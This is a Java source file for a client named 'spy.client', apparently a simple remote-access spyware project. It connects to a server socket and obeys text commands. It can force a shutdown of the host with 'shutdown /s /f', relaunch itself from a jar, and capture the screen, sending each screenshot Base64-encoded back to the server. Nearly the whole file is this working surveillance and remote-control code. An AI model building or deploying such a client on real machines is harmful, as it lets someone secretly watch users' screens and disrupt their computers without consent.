/*
* To change this license header, choose License Headers in Project Properties.
* To change this template file, choose Tools | Templates
* and open the template in the editor.
*/
package spy.client;

import java.io.*;
import java.net.*;
import java.text.SimpleDateFormat;
import java.util.Date;
import org.json.simple.JSONObject;
import java.util.Base64;
import static spy.client.Client.encodeImage;

public class Client
{   
    
    public static String encodeImage(byte[] imageByteArray) {
        return Base64.getEncoder().encodeToString(imageByteArray);
    }
    
    public static byte[] decodeImage(String imageDataString) {
        return Base64.getDecoder().decode(imageDataString);
    }
    
    public static void main(String[] args)
    {   
        String ipaddr="127.0.0.1";
        try
        {
            Socket s = new Socket(ipaddr, 6789);
            BufferedReader r = new BufferedReader(new InputStreamReader(s.getInputStream()));
            PrintWriter w = new PrintWriter(s.getOutputStream(), true);
            //BufferedReader con = new BufferedReader(new InputStreamReader(System.in));
            String line;
            new Handler(r,w);
            System.out.println("init");
        }
        catch (Exception err)
        {
            System.err.println(err);
        }
    }
   
}

class Handler implements Runnable {
    //create byte array
    BufferedReader r; String line;
    PrintWriter pr;
    String ipaddr="127.0.0.1";
    Runtime runtime; Process process;
    Handler (BufferedReader s,PrintWriter pr){
        this.r=s;
        this.pr=pr;
        new Thread(this).start();
        System.out.println("Thread created.");
    }
    
    public void run(){
        try{
            
            while(true)
            {
                line = r.readLine();
                //if ( line != null )
                System.out.println("From Server: "+line);
                if(line.contains("shutdown"))
                {
                    runtime = Runtime.getRuntime();
                    process = runtime.exec("shutdown /s /f");
                    
                pr.println("ok");
                pr.flush();
                }else if(line.contains("stop"))
                {
                    pr.println("Stop client");
                    pr.flush();
                    System.exit(0);
                }
                else if(line.contains("start"))
                {
                    System.out.println("Client Started...");
                    Runtime.getRuntime().exec("java -jar /root/Documents/PRO/spy-client/dist/spy-client.jar");
                    pr.println("Start client");
                    pr.flush();
                }
                else if(line.contains("scr")){
                    
                    CaptureScreen cs = new CaptureScreen();
                    SimpleDateFormat dttm=new SimpleDateFormat("dd-mm-yyyy-HH-mm-ss");
                    File fl=cs.saveScreenshot("screen_"+dttm.format(new Date())+".jpg",ipaddr);
                    
                    if (fl.isFile()) {
                            FileInputStream imageInFile = new FileInputStream(fl);
                            byte imageData[] = new byte[(int) fl.length()];
                            imageInFile.read(imageData);
                            //Image conversion byte array in Base64 String
                            String imageDataString = encodeImage(imageData);
                            imageInFile.close();
                            //the object that will be send to Server
                            JSONObject obj = new JSONObject();
                            //name of the image
                            obj.put("filename",fl.getName());
                            //string obteined by the conversion of the image
                            obj.put("image", imageDataString);
                            pr.println(obj.toString());
                    }
                    
                    pr.flush();
                }
            }
        }
        catch (IOException e){System.out.println(e.toString());}
        catch(Exception ex) {System.out.println(ex.toString());}
    }
}